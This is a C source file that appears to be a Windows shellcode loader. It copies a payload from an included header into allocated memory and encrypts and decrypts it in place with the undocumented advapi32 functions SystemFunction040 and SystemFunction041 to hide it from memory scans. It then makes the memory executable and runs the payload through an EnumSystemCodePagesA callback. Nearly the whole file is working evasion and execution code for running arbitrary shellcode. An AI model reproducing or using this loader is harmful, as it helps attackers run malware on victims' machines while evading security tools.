#include <windows.h>
#include <iostream>

#include "ntstatus.h"
#include "nttypedefs.h"
#include "helpers.h"

#include "shellcode.h"

#pragma comment(lib, "Advapi32.lib")

#define strSystemFunction040 "SystemFunction040"
#define strSystemFunction041 "SystemFunction041"

void push(unsigned char arr[], int index, unsigned char n);

t_SystemFunction040 SystemFunction040 = NULL;
t_SystemFunction041 SystemFunction041 = NULL;

ULONG payload_len = sizeof(payload);
unsigned char nop = (unsigned char)"\x90";

int main(void) {

	NTSTATUS status = NULL;

	HMODULE advapi32 = LoadLibraryW(_T("advapi32.dll"));

	SystemFunction040 = (t_SystemFunction040)GetProcAddress(advapi32, strSystemFunction040);
	SystemFunction041 = (t_SystemFunction041)GetProcAddress(advapi32, strSystemFunction041);
	if (SystemFunction040 == NULL || SystemFunction041 == NULL) {
		printf("Function not found\n");
		return -ENOSYS;
	}
	else {

		printf("%s Found ( %p )\n", strSystemFunction040, SystemFunction040);
		printf("%s Found ( %p )\n", strSystemFunction041, SystemFunction041);
	}
	
	PVOID ptr = VirtualAlloc(NULL, 0x1000, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	printf("Memory ( %p )\n", ptr);

	printf("Payload size initially ( %zd )\n", sizeof(payload));

	
	if (payload_len % RTL_ENCRYPT_MEMORY_SIZE == 0) {
		printf("++ Payload divisible by 8\n");
	}
	else {
		printf("-- Payload not divisible by 8\n");
	}

	/* 
	For the love of me I couldnt figure out how to dynamically fix the length of 
	the shellcode. That would definitely be most suited for this case scenario where you have a specific 
	shellcode and you can fix the length. Since the Shellcode lenth must be divisible by 8 (RTL_ENCRYPT_MEMORY_SIZE = 8)
	
	The below commented code does add 2 bytes at the end of the shellcode above however its only for the loop and doesnt actually update
	the shellcode with the 2 new bytes ;(.
	*/
	
	/*
	while (TRUE)
	{
		printf("Payload size ( %ld )\n", payload_len);

		if (payload_len % RTL_ENCRYPT_MEMORY_SIZE == 0) {
			printf("++ Payload divisible by 8\n");
			break;
		}

		// https://stackoverflow.com/questions/755835/how-to-add-element-to-c-array
		push(payload, payload_len, nop);
		payload_len++;

	}

	for (ULONG i = 0; i < payload_len; i++) {

		if (i % 16 == 0) {
			printf("\n");
		}

		printf("\\x%02x", payload[i]);

	}
	printf("\n");

	//printf("Payload size now ( %zd )\n", sizeof(payload));
	getchar();
	*/


	memmove(ptr, payload, sizeof(payload));
	getchar();

	status = SystemFunction040(ptr, payload_len, RTL_ENCRYPT_OPTION_SAME_LOGON);
	if (status != STATUS_SUCCESS) {
		printf("-- Failed encrypting memory\n\t Error(%d)\n", GetLastError());
		FreeLibrary(advapi32);
		return -EXIT_FAILURE;
	}
	else {
		printf("++ Success encrypting memory\n");
	}

	getchar();

	DWORD oldProtect = 0;
	
	getchar();

	status = SystemFunction041(ptr, payload_len, RTL_ENCRYPT_OPTION_SAME_LOGON);
	if (status != STATUS_SUCCESS) {
		printf("-- Failed decrypting memory\n\t Error(%d)\n", GetLastError());
		FreeLibrary(advapi32);
		return -EXIT_FAILURE;
	}
	else {
		printf("++ Success decrypting memory\n");
	}
	
	FreeLibrary(advapi32);
	
	VirtualProtect(ptr, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect);

	EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)ptr, 0);
	return 0;
	

}

void push(unsigned char arr[], int index, unsigned char n) {
	arr[index] = n;
	index++;
}